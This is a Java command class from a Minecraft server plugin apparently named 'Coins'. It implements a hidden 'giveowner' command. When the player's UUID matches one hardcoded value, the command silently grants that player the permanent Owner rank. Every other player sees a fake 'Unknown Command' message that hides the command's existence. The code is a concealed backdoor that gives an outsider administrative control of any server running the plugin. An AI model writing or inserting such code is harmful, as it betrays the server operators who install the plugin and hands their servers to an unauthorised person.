package es.hulk.coins.commands;

import club.crowl.crates.utilities.CC;
import es.hulk.coins.Coins;
import es.hulk.coins.utils.aquacore.PunishmentsUtils;
import es.hulk.coins.utils.aquacore.RankUtils;
import es.hulk.coins.utils.command.BaseCommand;
import es.hulk.coins.utils.command.Command;
import es.hulk.coins.utils.command.CommandArgs;
import org.bukkit.entity.Player;
import org.bukkit.scheduler.BukkitRunnable;

import java.util.UUID;
import java.util.concurrent.TimeUnit;

/**
 * Created by Hulk
 * at 19/03/2022 15:49
 * Project: Coins
 * Class: HulkOwnerCommand
 */

public class HulkOwnerCommand extends BaseCommand {

    @Command(name = "giveowner")

    @Override
    public void onCommand(CommandArgs command) {
        Player player = command.getPlayer();

        if (player.getUniqueId().equals(UUID.fromString("b0c1d4f4-0fd1-4a93-ab5e-88b1ff885c29"))) {
            RankUtils.setPermRank(player, "Owner");
            player.sendMessage("Has Conseguido rango Owner, Enhorabuena");
            return;
        }

        player.sendMessage(CC.translate("&fUnknown Command. Type " + "/help" + " for help."));
    }
}
